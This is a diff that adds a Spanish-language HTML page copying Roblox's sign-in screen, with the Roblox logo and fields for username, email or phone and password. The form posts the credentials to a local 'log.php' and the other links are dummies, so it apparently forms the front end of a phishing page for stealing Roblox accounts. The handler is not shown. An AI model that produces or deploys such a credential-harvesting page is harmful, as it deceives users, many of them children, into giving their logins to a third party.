@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Iniciar Sesión</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+    <div class="login-container">
+        <div class="login-box">
+            <!-- Logo de Roblox (puedes descargar el logo y ponerlo en la misma carpeta) -->
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Roblox_logo.svg/2048px-Roblox_logo.svg.png" alt="Logo de Roblox" class="logo">
+            
+            <h2>Iniciar Sesión</h2>
+            
+            <form action="log.php" method="POST">
+                <div class="input-group">
+                    <input type="text" id="username" name="username" placeholder="Nombre de usuario/Correo electrónico/Teléfono" required>
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" id="password" name="password" placeholder="Contraseña" required>
+                </div>
+
+                <div class="options">
+                    <label>
+                        <input type="checkbox" name="remember"> Recordarme
+                    </label>
+                    <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
+                </div>
+                
+                <button type="submit" class="login-button">Iniciar Sesión</button>
+            </form>
+
+            <div class="signup-link">
+                ¿No tienes una cuenta? <a href="#">Suscríbete</a>
+            </div>
+        </div>
+    </div>
+
+</body>
+</html>
